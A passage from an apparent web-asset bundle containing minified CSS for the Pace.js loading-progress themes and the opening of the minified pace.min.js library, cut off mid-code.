.pace-progress-inner:before{-webkit-transform:rotate(34deg);-ms-transform:rotate(34deg);transform:rotate(34deg)}.pace-progress[data-progress=\"23\"] .pace-progress-inner:before{-webkit-transform:rotate(38deg);-ms-transform:rotate(38deg);transform:rotate(38deg)}.pace-progress[data-progress=\"24\"] .pace-progress-inner:before{-webkit-transform:rotate(41deg);-ms-transform:rotate(41deg);transform:rotate(41deg)}.pace-progress[data-progress=\"25\"] .pace-progress-inner:before{-webkit-transform:rotate(45deg);-ms-transform:rotate(45deg);transform:rotate(45deg)}.pace-progress[data-progress=\"26\"] .pace-progress-inner:before{-webkit-transform:rotate(49deg);-ms-transform:rotate(49deg);transform:rotate(49deg)}.pace-progress[data-progress=\"27\"] .pace-progress-inner:before{-webkit-transform:rotate(52deg);-ms-transform:rotate(52deg);transform:rotate(52deg)}.pace-progress[data-progress=\"28\"] .pace-progress-inner:before{-webkit-transform:rotate(56deg);-ms-transform:rotate(56deg);transform:rotate(56deg)}.pace-progress[data-progress=\"29\"] .pace-progress-inner:before{-webkit-transform:rotate(59deg);-ms-transform:rotate(59deg);transform:rotate(59deg)}.pace-progress[data-progress=\"30\"] .pace-progress-inner:before{-webkit-transform:rotate(63deg);-ms-transform:rotate(63deg);transform:rotate(63deg)}.pace-progress[data-progress=\"31\"] .pace-progress-inner:before{-webkit-transform:rotate(67deg);-ms-transform:rotate(67deg);transform:rotate(67deg)}.pace-progress[data-progress=\"32\"] .pace-progress-inner:before{-webkit-transform:rotate(70deg);-ms-transform:rotate(70deg);transform:rotate(70deg)}.pace-progress[data-progress=\"33\"] .pace-progress-inner:before{-webkit-transform:rotate(74deg);-ms-transform:rotate(74deg);transform:rotate(74deg)}.pace-progress[data-progress=\"34\"] .pace-progress-inner:before{-webkit-transform:rotate(77deg);-ms-transform:rotate(77deg);transform:rotate(77deg)}.pace-progress[data-progress=\"35\"] .pace-progress-inner:before{-webkit-transform:rotate(81deg);-ms-transform:rotate(81deg);transform:rotate(81deg)}.pace-progress[data-progress=\"36\"] .pace-progress-inner:before{-webkit-transform:rotate(85deg);-ms-transform:rotate(85deg);transform:rotate(85deg)}.pace-progress[data-progress=\"37\"] .pace-progress-inner:before{-webkit-transform:rotate(88deg);-ms-transform:rotate(88deg);transform:rotate(88deg)}.pace-progress[data-progress=\"38\"] .pace-progress-inner:before{-webkit-transform:rotate(92deg);-ms-transform:rotate(92deg);transform:rotate(92deg)}.pace-progress[data-progress=\"39\"] .pace-progress-inner:before{-webkit-transform:rotate(95deg);-ms-transform:rotate(95deg);transform:rotate(95deg)}.pace-progress[data-progress=\"40\"] .pace-progress-inner:before{-webkit-transform:rotate(99deg);-ms-transform:rotate(99deg);transform:rotate(99deg)}.pace-progress[data-progress=\"41\"] .pace-progress-inner:before{-webkit-transform:rotate(103deg);-ms-transform:rotate(103deg);transform:rotate(103deg)}.pace-progress[data-progress=\"42\"] .pace-progress-inner:before{-webkit-transform:rotate(106deg);-ms-transform:rotate(106deg);transform:rotate(106deg)}.pace-progress[data-progress=\"43\"] .pace-progress-inner:before{-webkit-transform:rotate(110deg);-ms-transform:rotate(110deg);transform:rotate(110deg)}.pace-progress[data-progress=\"44\"] .pace-progress-inner:before{-webkit-transform:rotate(113deg);-ms-transform:rotate(113deg);transform:rotate(113deg)}.pace-progress[data-progress=\"45\"] .pace-progress-inner:before{-webkit-transform:rotate(117deg);-ms-transform:rotate(117deg);transform:rotate(117deg)}.pace-progress[data-progress=\"46\"] .pace-progress-inner:before{-webkit-transform:rotate(121deg);-ms-transform:rotate(121deg);transform:rotate(121deg)}.pace-progress[data-progress=\"47\"] .pace-progress-inner:before{-webkit-transform:rotate(124deg);-ms-transform:rotate(124deg);transform:rotate(124deg)}.pace-progress[data-progress=\"48\"] .pace-progress-inner:before{-webkit-transform:rotate(128deg);-ms-transform:rotate(128deg);transform:rotate(128deg)}.pace-progress[data-progress=\"49\"] .pace-progress-inner:before{-webkit-transform:rotate(131deg);-ms-transform:rotate(131deg);transform:rotate(131deg)}.pace-progress[data-progress=\"50\"] .pace-progress-inner:before{-webkit-transform:rotate(135deg);-ms-transform:rotate(135deg);transform:rotate(135deg)}.pace-progress[data-progress=\"50\"] .pace-progress-inner:after{-webkit-transform:rotate(315deg);-ms-transform:rotate(315deg);transform:rotate(315deg);display:block}.pace-progress[data-progress=\"51\"] .pace-progress-inner:after{-webkit-transform:rotate(319deg);-ms-transform:rotate(319deg);transform:rotate(319deg);display:block}.pace-progress[data-progress=\"52\"] .pace-progress-inner:after{-webkit-transform:rotate(322deg);-ms-transform:rotate(322deg);transform:rotate(322deg);display:block}.pace-progress[data-progress=\"53\"] .pace-progress-inner:after{-webkit-transform:rotate(326deg);-ms-transform:rotate(326deg);transform:rotate(326deg);display:block}.pace-progress[data-progress=\"54\"] .pace-progress-inner:after{-webkit-transform:rotate(329deg);-ms-transform:rotate(329deg);transform:rotate(329deg);display:block}.pace-progress[data-progress=\"55\"] .pace-progress-inner:after{-webkit-transform:rotate(333deg);-ms-transform:rotate(333deg);transform:rotate(333deg);display:block}.pace-progress[data-progress=\"56\"] .pace-progress-inner:after{-webkit-transform:rotate(337deg);-ms-transform:rotate(337deg);transform:rotate(337deg);display:block}.pace-progress[data-progress=\"57\"] .pace-progress-inner:after{-webkit-transform:rotate(340deg);-ms-transform:rotate(340deg);transform:rotate(340deg);display:block}.pace-progress[data-progress=\"58\"] .pace-progress-inner:after{-webkit-transform:rotate(344deg);-ms-transform:rotate(344deg);transform:rotate(344deg);display:block}.pace-progress[data-progress=\"59\"] .pace-progress-inner:after{-webkit-transform:rotate(347deg);-ms-transform:rotate(347deg);transform:rotate(347deg);display:block}.pace-progress[data-progress=\"60\"] .pace-progress-inner:after{-webkit-transform:rotate(351deg);-ms-transform:rotate(351deg);transform:rotate(351deg);display:block}.pace-progress[data-progress=\"61\"] .pace-progress-inner:after{-webkit-transform:rotate(355deg);-ms-transform:rotate(355deg);transform:rotate(355deg);display:block}.pace-progress[data-progress=\"62\"] .pace-progress-inner:after{-webkit-transform:rotate(358deg);-ms-transform:rotate(358deg);transform:rotate(358deg);display:block}.pace-progress[data-progress=\"63\"] .pace-progress-inner:after{-webkit-transform:rotate(362deg);-ms-transform:rotate(362deg);transform:rotate(362deg);display:block}.pace-progress[data-progress=\"64\"] .pace-progress-inner:after{-webkit-transform:rotate(365deg);-ms-transform:rotate(365deg);transform:rotate(365deg);display:block}.pace-progress[data-progress=\"65\"] .pace-progress-inner:after{-webkit-transform:rotate(369deg);-ms-transform:rotate(369deg);transform:rotate(369deg);display:block}.pace-progress[data-progress=\"66\"] .pace-progress-inner:after{-webkit-transform:rotate(373deg);-ms-transform:rotate(373deg);transform:rotate(373deg);display:block}.pace-progress[data-progress=\"67\"] .pace-progress-inner:after{-webkit-transform:rotate(376deg);-ms-transform:rotate(376deg);transform:rotate(376deg);display:block}.pace-progress[data-progress=\"68\"] .pace-progress-inner:after{-webkit-transform:rotate(380deg);-ms-transform:rotate(380deg);transform:rotate(380deg);display:block}.pace-progress[data-progress=\"69\"] .pace-progress-inner:after{-webkit-transform:rotate(383deg);-ms-transform:rotate(383deg);transform:rotate(383deg);display:block}.pace-progress[data-progress=\"70\"] .pace-progress-inner:after{-webkit-transform:rotate(387deg);-ms-transform:rotate(387deg);transform:rotate(387deg);display:block}.pace-progress[data-progress=\"71\"] .pace-progress-inner:after{-webkit-transform:rotate(391deg);-ms-transform:rotate(391deg);transform:rotate(391deg);display:block}.pace-progress[data-progress=\"72\"] .pace-progress-inner:after{-webkit-transform:rotate(394deg);-ms-transform:rotate(394deg);transform:rotate(394deg);display:block}.pace-progress[data-progress=\"73\"] .pace-progress-inner:after{-webkit-transform:rotate(398deg);-ms-transform:rotate(398deg);transform:rotate(398deg);display:block}.pace-progress[data-progress=\"74\"] .pace-progress-inner:after{-webkit-transform:rotate(401deg);-ms-transform:rotate(401deg);transform:rotate(401deg);display:block}.pace-progress[data-progress=\"75\"] .pace-progress-inner:after{-webkit-transform:rotate(405deg);-ms-transform:rotate(405deg);transform:rotate(405deg);display:block}.pace-progress[data-progress=\"76\"] .pace-progress-inner:after{-webkit-transform:rotate(409deg);-ms-transform:rotate(409deg);transform:rotate(409deg);display:block}.pace-progress[data-progress=\"77\"] .pace-progress-inner:after{-webkit-transform:rotate(412deg);-ms-transform:rotate(412deg);transform:rotate(412deg);display:block}.pace-progress[data-progress=\"78\"] .pace-progress-inner:after{-webkit-transform:rotate(416deg);-ms-transform:rotate(416deg);transform:rotate(416deg);display:block}.pace-progress[data-progress=\"79\"] .pace-progress-inner:after{-webkit-transform:rotate(419deg);-ms-transform:rotate(419deg);transform:rotate(419deg);display:block}.pace-progress[data-progress=\"80\"] .pace-progress-inner:after{-webkit-transform:rotate(423deg);-ms-transform:rotate(423deg);transform:rotate(423deg);display:block}.pace-progress[data-progress=\"81\"] .pace-progress-inner:after{-webkit-transform:rotate(427deg);-ms-transform:rotate(427deg);transform:rotate(427deg);display:block}.pace-progress[data-progress=\"82\"] .pace-progress-inner:after{-webkit-transform:rotate(430deg);-ms-transform:rotate(430deg);transform:rotate(430deg);display:block}.pace-progress[data-progress=\"83\"] .pace-progress-inner:after{-webkit-transform:rotate(434deg);-ms-transform:rotate(434deg);transform:rotate(434deg);display:block}.pace-progress[data-progress=\"84\"] .pace-progress-inner:after{-webkit-transform:rotate(437deg);-ms-transform:rotate(437deg);transform:rotate(437deg);display:block}.pace-progress[data-progress=\"85\"] .pace-progress-inner:after{-webkit-transform:rotate(441deg);-ms-transform:rotate(441deg);transform:rotate(441deg);display:block}.pace-progress[data-progress=\"86\"] .pace-progress-inner:after{-webkit-transform:rotate(445deg);-ms-transform:rotate(445deg);transform:rotate(445deg);display:block}.pace-progress[data-progress=\"87\"] .pace-progress-inner:after{-webkit-transform:rotate(448deg);-ms-transform:rotate(448deg);transform:rotate(448deg);display:block}.pace-progress[data-progress=\"88\"] .pace-progress-inner:after{-webkit-transform:rotate(452deg);-ms-transform:rotate(452deg);transform:rotate(452deg);display:block}.pace-progress[data-progress=\"89\"] .pace-progress-inner:after{-webkit-transform:rotate(455deg);-ms-transform:rotate(455deg);transform:rotate(455deg);display:block}.pace-progress[data-progress=\"90\"] .pace-progress-inner:after{-webkit-transform:rotate(459deg);-ms-transform:rotate(459deg);transform:rotate(459deg);display:block}.pace-progress[data-progress=\"91\"] .pace-progress-inner:after{-webkit-transform:rotate(463deg);-ms-transform:rotate(463deg);transform:rotate(463deg);display:block}.pace-progress[data-progress=\"92\"] .pace-progress-inner:after{-webkit-transform:rotate(466deg);-ms-transform:rotate(466deg);transform:rotate(466deg);display:block}.pace-progress[data-progress=\"93\"] .pace-progress-inner:after{-webkit-transform:rotate(470deg);-ms-transform:rotate(470deg);transform:rotate(470deg);display:block}.pace-progress[data-progress=\"94\"] .pace-progress-inner:after{-webkit-transform:rotate(473deg);-ms-transform:rotate(473deg);transform:rotate(473deg);display:block}.pace-progress[data-progress=\"95\"] .pace-progress-inner:after{-webkit-transform:rotate(477deg);-ms-transform:rotate(477deg);transform:rotate(477deg);display:block}.pace-progress[data-progress=\"96\"] .pace-progress-inner:after{-webkit-transform:rotate(481deg);-ms-transform:rotate(481deg);transform:rotate(481deg);display:block}.pace-progress[data-progress=\"97\"] .pace-progress-inner:after{-webkit-transform:rotate(484deg);-ms-transform:rotate(484deg);transform:rotate(484deg);display:block}.pace-progress[data-progress=\"98\"] .pace-progress-inner:after{-webkit-transform:rotate(488deg);-ms-transform:rotate(488deg);transform:rotate(488deg);display:block}.pace-progress[data-progress=\"99\"] .pace-progress-inner:after{-webkit-transform:rotate(491deg);-ms-transform:rotate(491deg);transform:rotate(491deg);display:block}.pace-progress[data-progress=\"100\"] .pace-progress-inner:after{-webkit-transform:rotate(495deg);-ms-transform:rotate(495deg);transform:rotate(495deg);display:block}.pace-progress[data-progress=\"00\"] .pace-progress-inner{-webkit-transform:rotate(0);-ms-transform:rotate(0);transform:rotate(0)}.pace-progress[data-progress=\"01\"] .pace-progress-inner{-webkit-transform:rotate(4deg);-ms-transform:rotate(4deg);transform:rotate(4deg)}.pace-progress[data-progress=\"02\"] .pace-progress-inner{-webkit-transform:rotate(7deg);-ms-transform:rotate(7deg);transform:rotate(7deg)}.pace-progress[data-progress=\"03\"] .pace-progress-inner{-webkit-transform:rotate(11deg);-ms-transform:rotate(11deg);transform:rotate(11deg)}.pace-progress[data-progress=\"04\"] .pace-progress-inner{-webkit-transform:rotate(14deg);-ms-transform:rotate(14deg);transform:rotate(14deg)}.pace-progress[data-progress=\"05\"] .pace-progress-inner{-webkit-transform:rotate(18deg);-ms-transform:rotate(18deg);transform:rotate(18deg)}.pace-progress[data-progress=\"06\"] .pace-progress-inner{-webkit-transform:rotate(22deg);-ms-transform:rotate(22deg);transform:rotate(22deg)}.pace-progress[data-progress=\"07\"] .pace-progress-inner{-webkit-transform:rotate(25deg);-ms-transform:rotate(25deg);transform:rotate(25deg)}.pace-progress[data-progress=\"08\"] .pace-progress-inner{-webkit-transform:rotate(29deg);-ms-transform:rotate(29deg);transform:rotate(29deg)}.pace-progress[data-progress=\"09\"] .pace-progress-inner{-webkit-transform:rotate(32deg);-ms-transform:rotate(32deg);transform:rotate(32deg)}.pace-progress[data-progress=\"10\"] .pace-progress-inner{-webkit-transform:rotate(36deg);-ms-transform:rotate(36deg);transform:rotate(36deg)}.pace-progress[data-progress=\"11\"] .pace-progress-inner{-webkit-transform:rotate(40deg);-ms-transform:rotate(40deg);transform:rotate(40deg)}.pace-progress[data-progress=\"12\"] .pace-progress-inner{-webkit-transform:rotate(43deg);-ms-transform:rotate(43deg);transform:rotate(43deg)}.pace-progress[data-progress=\"13\"] .pace-progress-inner{-webkit-transform:rotate(47deg);-ms-transform:rotate(47deg);transform:rotate(47deg)}.pace-progress[data-progress=\"14\"] .pace-progress-inner{-webkit-transform:rotate(50deg);-ms-transform:rotate(50deg);transform:rotate(50deg)}.pace-progress[data-progress=\"15\"] .pace-progress-inner{-webkit-transform:rotate(54deg);-ms-transform:rotate(54deg);transform:rotate(54deg)}.pace-progress[data-progress=\"16\"] .pace-progress-inner{-webkit-transform:rotate(58deg);-ms-transform:rotate(58deg);transform:rotate(58deg)}.pace-progress[data-progress=\"17\"] .pace-progress-inner{-webkit-transform:rotate(61deg);-ms-transform:rotate(61deg);transform:rotate(61deg)}.pace-progress[data-progress=\"18\"] .pace-progress-inner{-webkit-transform:rotate(65deg);-ms-transform:rotate(65deg);transform:rotate(65deg)}.pace-progress[data-progress=\"19\"] .pace-progress-inner{-webkit-transform:rotate(68deg);-ms-transform:rotate(68deg);transform:rotate(68deg)}.pace-progress[data-progress=\"20\"] .pace-progress-inner{-webkit-transform:rotate(72deg);-ms-transform:rotate(72deg);transform:rotate(72deg)}.pace-progress[data-progress=\"21\"] .pace-progress-inner{-webkit-transform:rotate(76deg);-ms-transform:rotate(76deg);transform:rotate(76deg)}.pace-progress[data-progress=\"22\"] .pace-progress-inner{-webkit-transform:rotate(79deg);-ms-transform:rotate(79deg);transform:rotate(79deg)}.pace-progress[data-progress=\"23\"] .pace-progress-inner{-webkit-transform:rotate(83deg);-ms-transform:rotate(83deg);transform:rotate(83deg)}.pace-progress[data-progress=\"24\"] .pace-progress-inner{-webkit-transform:rotate(86deg);-ms-transform:rotate(86deg);transform:rotate(86deg)}.pace-progress[data-progress=\"25\"] .pace-progress-inner{-webkit-transform:rotate(90deg);-ms-transform:rotate(90deg);transform:rotate(90deg)}.pace-progress[data-progress=\"26\"] .pace-progress-inner{-webkit-transform:rotate(94deg);-ms-transform:rotate(94deg);transform:rotate(94deg)}.pace-progress[data-progress=\"27\"] .pace-progress-inner{-webkit-transform:rotate(97deg);-ms-transform:rotate(97deg);transform:rotate(97deg)}.pace-progress[data-progress=\"28\"] .pace-progress-inner{-webkit-transform:rotate(101deg);-ms-transform:rotate(101deg);transform:rotate(101deg)}.pace-progress[data-progress=\"29\"] .pace-progress-inner{-webkit-transform:rotate(104deg);-ms-transform:rotate(104deg);transform:rotate(104deg)}.pace-progress[data-progress=\"30\"] .pace-progress-inner{-webkit-transform:rotate(108deg);-ms-transform:rotate(108deg);transform:rotate(108deg)}.pace-progress[data-progress=\"31\"] .pace-progress-inner{-webkit-transform:rotate(112deg);-ms-transform:rotate(112deg);transform:rotate(112deg)}.pace-progress[data-progress=\"32\"] .pace-progress-inner{-webkit-transform:rotate(115deg);-ms-transform:rotate(115deg);transform:rotate(115deg)}.pace-progress[data-progress=\"33\"] .pace-progress-inner{-webkit-transform:rotate(119deg);-ms-transform:rotate(119deg);transform:rotate(119deg)}.pace-progress[data-progress=\"34\"] .pace-progress-inner{-webkit-transform:rotate(122deg);-ms-transform:rotate(122deg);transform:rotate(122deg)}.pace-progress[data-progress=\"35\"] .pace-progress-inner{-webkit-transform:rotate(126deg);-ms-transform:rotate(126deg);transform:rotate(126deg)}.pace-progress[data-progress=\"36\"] .pace-progress-inner{-webkit-transform:rotate(130deg);-ms-transform:rotate(130deg);transform:rotate(130deg)}.pace-progress[data-progress=\"37\"] .pace-progress-inner{-webkit-transform:rotate(133deg);-ms-transform:rotate(133deg);transform:rotate(133deg)}.pace-progress[data-progress=\"38\"] .pace-progress-inner{-webkit-transform:rotate(137deg);-ms-transform:rotate(137deg);transform:rotate(137deg)}.pace-progress[data-progress=\"39\"] .pace-progress-inner{-webkit-transform:rotate(140deg);-ms-transform:rotate(140deg);transform:rotate(140deg)}.pace-progress[data-progress=\"40\"] .pace-progress-inner{-webkit-transform:rotate(144deg);-ms-transform:rotate(144deg);transform:rotate(144deg)}.pace-progress[data-progress=\"41\"] .pace-progress-inner{-webkit-transform:rotate(148deg);-ms-transform:rotate(148deg);transform:rotate(148deg)}.pace-progress[data-progress=\"42\"] .pace-progress-inner{-webkit-transform:rotate(151deg);-ms-transform:rotate(151deg);transform:rotate(151deg)}.pace-progress[data-progress=\"43\"] .pace-progress-inner{-webkit-transform:rotate(155deg);-ms-transform:rotate(155deg);transform:rotate(155deg)}.pace-progress[data-progress=\"44\"] .pace-progress-inner{-webkit-transform:rotate(158deg);-ms-transform:rotate(158deg);transform:rotate(158deg)}.pace-progress[data-progress=\"45\"] .pace-progress-inner{-webkit-transform:rotate(162deg);-ms-transform:rotate(162deg);transform:rotate(162deg)}.pace-progress[data-progress=\"46\"] .pace-progress-inner{-webkit-transform:rotate(166deg);-ms-transform:rotate(166deg);transform:rotate(166deg)}.pace-progress[data-progress=\"47\"] .pace-progress-inner{-webkit-transform:rotate(169deg);-ms-transform:rotate(169deg);transform:rotate(169deg)}.pace-progress[data-progress=\"48\"] .pace-progress-inner{-webkit-transform:rotate(173deg);-ms-transform:rotate(173deg);transform:rotate(173deg)}.pace-progress[data-progress=\"49\"] .pace-progress-inner{-webkit-transform:rotate(176deg);-ms-transform:rotate(176deg);transform:rotate(176deg)}.pace-progress[data-progress=\"50\"] .pace-progress-inner{-webkit-transform:rotate(180deg);-ms-transform:rotate(180deg);transform:rotate(180deg)}.pace-progress[data-progress=\"51\"] .pace-progress-inner{-webkit-transform:rotate(184deg);-ms-transform:rotate(184deg);transform:rotate(184deg);overflow:visible}.pace-progress[data-progress=\"52\"] .pace-progress-inner{-webkit-transform:rotate(187deg);-ms-transform:rotate(187deg);transform:rotate(187deg);overflow:visible}.pace-progress[data-progress=\"53\"] .pace-progress-inner{-webkit-transform:rotate(191deg);-ms-transform:rotate(191deg);transform:rotate(191deg);overflow:visible}.pace-progress[data-progress=\"54\"] .pace-progress-inner{-webkit-transform:rotate(194deg);-ms-transform:rotate(194deg);transform:rotate(194deg);overflow:visible}.pace-progress[data-progress=\"55\"] .pace-progress-inner{-webkit-transform:rotate(198deg);-ms-transform:rotate(198deg);transform:rotate(198deg);overflow:visible}.pace-progress[data-progress=\"56\"] .pace-progress-inner{-webkit-transform:rotate(202deg);-ms-transform:rotate(202deg);transform:rotate(202deg);overflow:visible}.pace-progress[data-progress=\"57\"] .pace-progress-inner{-webkit-transform:rotate(205deg);-ms-transform:rotate(205deg);transform:rotate(205deg);overflow:visible}.pace-progress[data-progress=\"58\"] .pace-progress-inner{-webkit-transform:rotate(209deg);-ms-transform:rotate(209deg);transform:rotate(209deg);overflow:visible}.pace-progress[data-progress=\"59\"] .pace-progress-inner{-webkit-transform:rotate(212deg);-ms-transform:rotate(212deg);transform:rotate(212deg);overflow:visible}.pace-progress[data-progress=\"60\"] .pace-progress-inner{-webkit-transform:rotate(216deg);-ms-transform:rotate(216deg);transform:rotate(216deg);overflow:visible}.pace-progress[data-progress=\"61\"] .pace-progress-inner{-webkit-transform:rotate(220deg);-ms-transform:rotate(220deg);transform:rotate(220deg);overflow:visible}.pace-progress[data-progress=\"62\"] .pace-progress-inner{-webkit-transform:rotate(223deg);-ms-transform:rotate(223deg);transform:rotate(223deg);overflow:visible}.pace-progress[data-progress=\"63\"] .pace-progress-inner{-webkit-transform:rotate(227deg);-ms-transform:rotate(227deg);transform:rotate(227deg);overflow:visible}.pace-progress[data-progress=\"64\"] .pace-progress-inner{-webkit-transform:rotate(230deg);-ms-transform:rotate(230deg);transform:rotate(230deg);overflow:visible}.pace-progress[data-progress=\"65\"] .pace-progress-inner{-webkit-transform:rotate(234deg);-ms-transform:rotate(234deg);transform:rotate(234deg);overflow:visible}.pace-progress[data-progress=\"66\"] .pace-progress-inner{-webkit-transform:rotate(238deg);-ms-transform:rotate(238deg);transform:rotate(238deg);overflow:visible}.pace-progress[data-progress=\"67\"] .pace-progress-inner{-webkit-transform:rotate(241deg);-ms-transform:rotate(241deg);transform:rotate(241deg);overflow:visible}.pace-progress[data-progress=\"68\"] .pace-progress-inner{-webkit-transform:rotate(245deg);-ms-transform:rotate(245deg);transform:rotate(245deg);overflow:visible}.pace-progress[data-progress=\"69\"] .pace-progress-inner{-webkit-transform:rotate(248deg);-ms-transform:rotate(248deg);transform:rotate(248deg);overflow:visible}.pace-progress[data-progress=\"70\"] .pace-progress-inner{-webkit-transform:rotate(252deg);-ms-transform:rotate(252deg);transform:rotate(252deg);overflow:visible}.pace-progress[data-progress=\"71\"] .pace-progress-inner{-webkit-transform:rotate(256deg);-ms-transform:rotate(256deg);transform:rotate(256deg);overflow:visible}.pace-progress[data-progress=\"72\"] .pace-progress-inner{-webkit-transform:rotate(259deg);-ms-transform:rotate(259deg);transform:rotate(259deg);overflow:visible}.pace-progress[data-progress=\"73\"] .pace-progress-inner{-webkit-transform:rotate(263deg);-ms-transform:rotate(263deg);transform:rotate(263deg);overflow:visible}.pace-progress[data-progress=\"74\"] .pace-progress-inner{-webkit-transform:rotate(266deg);-ms-transform:rotate(266deg);transform:rotate(266deg);overflow:visible}.pace-progress[data-progress=\"75\"] .pace-progress-inner{-webkit-transform:rotate(270deg);-ms-transform:rotate(270deg);transform:rotate(270deg);overflow:visible}.pace-progress[data-progress=\"76\"] .pace-progress-inner{-webkit-transform:rotate(274deg);-ms-transform:rotate(274deg);transform:rotate(274deg);overflow:visible}.pace-progress[data-progress=\"77\"] .pace-progress-inner{-webkit-transform:rotate(277deg);-ms-transform:rotate(277deg);transform:rotate(277deg);overflow:visible}.pace-progress[data-progress=\"78\"] .pace-progress-inner{-webkit-transform:rotate(281deg);-ms-transform:rotate(281deg);transform:rotate(281deg);overflow:visible}.pace-progress[data-progress=\"79\"] .pace-progress-inner{-webkit-transform:rotate(284deg);-ms-transform:rotate(284deg);transform:rotate(284deg);overflow:visible}.pace-progress[data-progress=\"80\"] .pace-progress-inner{-webkit-transform:rotate(288deg);-ms-transform:rotate(288deg);transform:rotate(288deg);overflow:visible}.pace-progress[data-progress=\"81\"] .pace-progress-inner{-webkit-transform:rotate(292deg);-ms-transform:rotate(292deg);transform:rotate(292deg);overflow:visible}.pace-progress[data-progress=\"82\"] .pace-progress-inner{-webkit-transform:rotate(295deg);-ms-transform:rotate(295deg);transform:rotate(295deg);overflow:visible}.pace-progress[data-progress=\"83\"] .pace-progress-inner{-webkit-transform:rotate(299deg);-ms-transform:rotate(299deg);transform:rotate(299deg);overflow:visible}.pace-progress[data-progress=\"84\"] .pace-progress-inner{-webkit-transform:rotate(302deg);-ms-transform:rotate(302deg);transform:rotate(302deg);overflow:visible}.pace-progress[data-progress=\"85\"] .pace-progress-inner{-webkit-transform:rotate(306deg);-ms-transform:rotate(306deg);transform:rotate(306deg);overflow:visible}.pace-progress[data-progress=\"86\"] .pace-progress-inner{-webkit-transform:rotate(310deg);-ms-transform:rotate(310deg);transform:rotate(310deg);overflow:visible}.pace-progress[data-progress=\"87\"] .pace-progress-inner{-webkit-transform:rotate(313deg);-ms-transform:rotate(313deg);transform:rotate(313deg);overflow:visible}.pace-progress[data-progress=\"88\"] .pace-progress-inner{-webkit-transform:rotate(317deg);-ms-transform:rotate(317deg);transform:rotate(317deg);overflow:visible}.pace-progress[data-progress=\"89\"] .pace-progress-inner{-webkit-transform:rotate(320deg);-ms-transform:rotate(320deg);transform:rotate(320deg);overflow:visible}.pace-progress[data-progress=\"90\"] .pace-progress-inner{-webkit-transform:rotate(324deg);-ms-transform:rotate(324deg);transform:rotate(324deg);overflow:visible}.pace-progress[data-progress=\"91\"] .pace-progress-inner{-webkit-transform:rotate(328deg);-ms-transform:rotate(328deg);transform:rotate(328deg);overflow:visible}.pace-progress[data-progress=\"92\"] .pace-progress-inner{-webkit-transform:rotate(331deg);-ms-transform:rotate(331deg);transform:rotate(331deg);overflow:visible}.pace-progress[data-progress=\"93\"] .pace-progress-inner{-webkit-transform:rotate(335deg);-ms-transform:rotate(335deg);transform:rotate(335deg);overflow:visible}.pace-progress[data-progress=\"94\"] .pace-progress-inner{-webkit-transform:rotate(338deg);-ms-transform:rotate(338deg);transform:rotate(338deg);overflow:visible}.pace-progress[data-progress=\"95\"] .pace-progress-inner{-webkit-transform:rotate(342deg);-ms-transform:rotate(342deg);transform:rotate(342deg);overflow:visible}.pace-progress[data-progress=\"96\"] .pace-progress-inner{-webkit-transform:rotate(346deg);-ms-transform:rotate(346deg);transform:rotate(346deg);overflow:visible}.pace-progress[data-progress=\"97\"] .pace-progress-inner{-webkit-transform:rotate(349deg);-ms-transform:rotate(349deg);transform:rotate(349deg);overflow:visible}.pace-progress[data-progress=\"98\"] .pace-progress-inner{-webkit-transform:rotate(353deg);-ms-transform:rotate(353deg);transform:rotate(353deg);overflow:visible}.pace-progress[data-progress=\"99\"] .pace-progress-inner{-webkit-transform:rotate(356deg);-ms-transform:rotate(356deg);transform:rotate(356deg);overflow:visible}.pace-progress[data-progress=\"100\"] .pace-progress-inner{-webkit-transform:rotate(360deg);-ms-transform:rotate(360deg);transform:rotate(360deg);overflow:visible}\n"},{"url":"/lib/pace/pace-theme-minimal.min.css","content":".pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none}.pace-inactive{display:none}.pace .pace-progress{background:#29d;position:fixed;z-index:2000;top:0;right:100%;width:100%;height:2px}"},{"url":"/lib/pace/pace.min.js","content":"/*! pace 1.0.2 */\n(function(){var a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z,A,B,C,D,E,F,G,H,I,J,K,L,M,N,O,P,Q,R,S,T,U,V,W,X=[].slice,Y={}.hasOwnProperty,Z=function(a,b){function c(){this.constructor=a}for(var d in b)Y.call(b,d)&&(a[d]=b[d]);return c.prototype=b.prototype,a.prototype=new c,a.__super__=b.prototype,a},$=[].indexOf||function(a){for(var b=0,c=this.length;c>b;b++)if(b in this&&this[b]===a)return b;return-1};for(u={catchupTime:100,initialRate:.03,minTime:250,ghostTime:100,maxProgressPerFrame:20,easeFactor:1.25,startOnPageLoad:!0,restartOnPushState:!0,restartOnRequestAfter:500,target:\"body\",elements:{checkInterval:100,selectors:[\"body\"]},eventLag:{minSamples:10,sampleCount:3,lagThreshold:3},ajax:{trackMethods:[\"GET\"],trackWebSockets:!0,ignoreURLs:[]}},C=function(){var a;return null!=(a=\"undefined\"!=typeof performance&&null!==performance&&\"function\"==typeof performance.now?performance.now():void 0)?a:+new Date},E=window.requestAnimationFrame||window.mozRequestAnimationFrame||window.webkitRequestAnimationFrame||window.msRequestAnimationFrame,t=window.cancelAnimationFrame||window.mozCancelAnimationFrame,null==E&&(E=function(a){return setTimeout(a,50)},t=function(a){return clearTimeout(a)}),G=function(a){var b,c;return b=C(),(c=function(){var d;return d=C()-b,d>=33?(b=C(),a(d,function(){return E(c)})):setTimeout(c,33-d)})()},F=function(){var a,b,c;return c=arguments[0],b=arguments[1],a=3<=arguments.length?X.call(arguments,2):[],\"function\"==typeof c[b]?c[b].apply(c,a):c[b]},v=function(){var a,b,c,d,e,f,g;for(b=arguments[0],d=2<=arguments.length?X.call(arguments,1):[],f=0,g=d.length;g>f;f++)if(c=d[f])for(a in c)Y.call(c,a)&&(e=c[a],null!=b[a]&&\"object\"==typeof b[a]&&null!=e&&\"object\"==typeof e?v(b[a],e):b[a]=e);return b},q=function(a){var b,c,d,e,f;for(c=b=0,e=0,f=a.length;f>e;e++)d=a[e],c+=Math.abs(d),b++;return c/b},x=function(a,b){var c,d,e;if(null==a&&(a=\"options\"),null==b&&(b=!0),e=document.querySelector(\"[data-pace-\"+a+\"]\")){if(c=e.getAttribute(\"data-pace-\"+a),!b)return c;try{return JSON.parse(c)}catch(f){return d=f,\"undefined\"!=typeof console&&null!==console?console.error(\"Error parsing inline pace options\",d):void 0}}},g=function(){function a(){}return a.prototype.on=function(a,b,c,d){var e;return null==d&&(d=!1),null==this.bindings&&(this.bindings={}),null==(e=this.bindings)[a]&&(e[a]=[]),this.bindings[a].push({handler:b,ctx:c,once:d})},a.prototype.once=function(a,b,c){return this.on(a,b,c,!0)},a.prototype.off=function(a,b){var 